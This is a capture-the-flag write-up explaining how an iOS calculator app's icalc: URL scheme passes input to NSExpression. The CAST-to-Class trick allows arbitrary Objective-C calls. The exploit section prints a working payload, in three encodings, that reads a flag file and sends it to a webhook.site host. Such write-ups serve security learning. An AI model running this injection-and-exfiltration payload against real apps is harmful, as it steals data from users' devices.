## Dezhou Instrumentz - pwn problem - 378 points (6 solves)

### Description

We're given an iPhone app which implements a simple calculator, and the ability to send a URL to a real physical iPhone with the app installed.

### Reversing

The code is written in Swift, and is thankfully full of symbols so it's very easy to reverse. The Info.plist shows that the calculator app provides the `icalc:` URL scheme, which is used to set the expression. It uses the built-in iOS NSExpression class to parse and execute the expressions you give it.

NSExpression is *very* powerful. It supports calling a large number of numeric methods out of NSPredicateUtilities, but most interestingly provides the `FUNCTION` and `CAST` operators which respectively let you call any Objective-C method on any object and let you cast any object to another type.

At first, it looked like we were only limited to calling methods on literals, such as strings, arrays and numbers. This is enough to call things like `superclass` to walk up the class hierarchy, but Objective-C doesn't provide a method to give you all the subclasses of a class.

To figure out if we could do more, we reversed the `+[NSPredicateUtilities castObject:(id) toType:(NSString)]` method in Foundation, which provides the `CAST` operator. To our surprise, the first thing it does is to check if the type is the string `Class`, and if so, directly calls `NSClassFromString` on the first argument to return that class object.

With this, it's possible to basically call any static method, which is sufficient to formulate an exploit. (This also shows that `NSExpression` is the closest thing that Objective-C/Swift have to an `eval` function!)

### Exploit

The exploit is pretty straightforward, and consists essentially of the following Objective-C code encoded as `FUNCTION` and `CLASS` calls:

```
id flagPath = [[NSBundle mainBundle] pathForResource:@"flag" ofType:@""];
id flag = [NSString stringWithContentsOfFile:flagPath];
id charset = [NSCharacterSet URLPathAllowedCharacterSet];
id encodedFlag = [flag stringByAddingPercentEncodingWithAllowedCharacters:charset];
id urlString = [@"https://webhook.site/2c4242f2-e8a2-46ce-ace8-373012388bbe/" stringByAppendingString:encodedFlag];
id url = [NSURL URLWithString:urlString];
id payload = [NSString stringWithContentsOfURL:url];
```

Encoded as an NSExpression using `FUNCTION` and `CAST` operators:

`FUNCTION(CAST('NSString', 'Class'), 'stringWithContentsOfURL:', FUNCTION(CAST('NSURL', 'Class'), 'URLWithString:', FUNCTION('https://webhook.site/2c4242f2-e8a2-46ce-ace8-373012388bbe/', 'stringByAppendingString:', FUNCTION(FUNCTION(CAST('NSString', 'Class'), 'stringWithContentsOfFile:', FUNCTION(FUNCTION(CAST('NSBundle', 'Class'), 'mainBundle'), 'pathForResource:ofType:', 'flag', '')), 'stringByAddingPercentEncodingWithAllowedCharacters:', FUNCTION(CAST('NSCharacterSet', 'Class'), 'URLPathAllowedCharacterSet')))))`

We encode the payload expression into the host part of an `icalc://` URL:

`icalc://FUNCTION%28CAST%28%27NSString%27%2C%20%27Class%27%29%2C%20%27stringWithContentsOfURL%3A%27%2C%20FUNCTION%28CAST%28%27NSURL%27%2C%20%27Class%27%29%2C%20%27URLWithString%3A%27%2C%20FUNCTION%28%27https%3A%2F%2Fwebhook.site%2F2c4242f2-e8a2-46ce-ace8-373012388bbe%2F%27%2C%20%27stringByAppendingString%3A%27%2C%20FUNCTION%28FUNCTION%28CAST%28%27NSString%27%2C%20%27Class%27%29%2C%20%27stringWithContentsOfFile%3A%27%2C%20FUNCTION%28FUNCTION%28CAST%28%27NSBundle%27%2C%20%27Class%27%29%2C%20%27mainBundle%27%29%2C%20%27pathForResource%3AofType%3A%27%2C%20%27flag%27%2C%20%27%27%29%29%2C%20%27stringByAddingPercentEncodingWithAllowedCharacters%3A%27%2C%20FUNCTION%28CAST%28%27NSCharacterSet%27%2C%20%27Class%27%29%2C%20%27URLPathAllowedCharacterSet%27%29%29%29%29%29`

Sending this to the iPhone promptly sends us back the flag in a GET request:

`rwctf{alldayidreamaboutprejailbrokeniphone}`
